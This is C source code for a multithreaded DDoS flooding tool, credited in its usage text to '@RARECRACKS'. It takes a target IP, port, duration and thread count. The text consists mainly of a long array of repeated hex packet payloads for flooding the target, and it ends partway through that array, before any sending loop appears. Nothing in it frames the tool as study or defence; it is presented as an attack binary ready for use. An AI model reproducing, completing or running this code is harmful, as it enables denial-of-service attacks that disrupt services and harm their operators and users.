#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <libgen.h>
#include <signal.h>

#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 15

volatile sig_atomic_t keep_running = 1;

void handle_sigint(int sig) {
    keep_running = 0; // Stop the attack gracefully
    printf("\n✋ Attack interrupted by user. Exiting...\n");
}

void usage() {
    printf("This Binary DDoS File Has Been Coded By @RARECRACKS\n");
    printf("./rare `IP` `PORT` `DURATION` `THREADS`\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

long packets_sent = 0;
long packets_failed = 0;

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    char *payloads[] = {
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x7E\\x07\\x00\\x00\\x03\\x00\\x00\\xC6\\x8A\\x97\\x2F\\x00\\x00\\x00",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x60\\x2B\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\x69\\x00\\xF7\\xFB\\x66",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
    "\\x66\\x61\\x2C\\x00\\x00\\xD1\\x07\\x00\\x93\\x80\\x80\\x98\\x01\\x94\\xA5\\x08\\xD8\\xB2\\x01\\xEA\\x85\\x02\\x00\\x00\\xC8\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xBD\\xB6\\xE1\\xF3\\x03\\x00\\xC4\\xB6\\xE1\\xFB\\x0B\\x00\\x00\\xA0\\x02\\x00\\x83\\x87\\x67",
